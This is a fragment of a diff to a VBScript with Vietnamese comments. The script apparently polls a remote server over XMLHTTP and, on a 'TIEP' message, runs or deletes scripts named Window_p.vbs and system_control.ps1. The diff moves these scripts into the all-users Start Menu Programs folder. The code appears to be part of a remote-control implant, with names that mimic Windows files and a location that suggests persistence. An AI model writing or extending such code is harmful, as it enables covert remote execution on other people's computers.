@@ -41,12 +41,12 @@ If xmlhttp.Status = 200 Then
         
         ' Xóa file Window_d.vbs
         Dim scriptToDelete
-        scriptToDelete = "C:\Users\Public\Public Sys\Window_p.vbs"
+        scriptToDelete = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Public Sys\Window_p.vbs"
         If objFSO.FileExists(scriptToDelete) Then
             objFSO.DeleteFile scriptToDelete
         End If
 	
-        scriptToDelete = "C:\Users\Public\Public Sys\system_control.ps1"
+        scriptToDelete = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Public Sys\system_control.ps1"
         If objFSO.FileExists(scriptToDelete) Then
             objFSO.DeleteFile scriptToDelete
         End If
@@ -56,7 +56,7 @@ If xmlhttp.Status = 200 Then
         ' Nếu tin nhắn là "TIEP", chạy file Window_d.vbs
 	Dim shell
 	Set shell = CreateObject("WScript.Shell")
-	shell.Run """C:\Users\Public\Public Sys\Window_p.vbs""", 1, False
+	shell.Run """C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Public Sys\Window_p.vbs""", 1, False
 	Set shell = Nothing
 
     ElseIf StrComp(Left(lastMessage, 4), "DUNG", vbTextCompare) = 0 Then
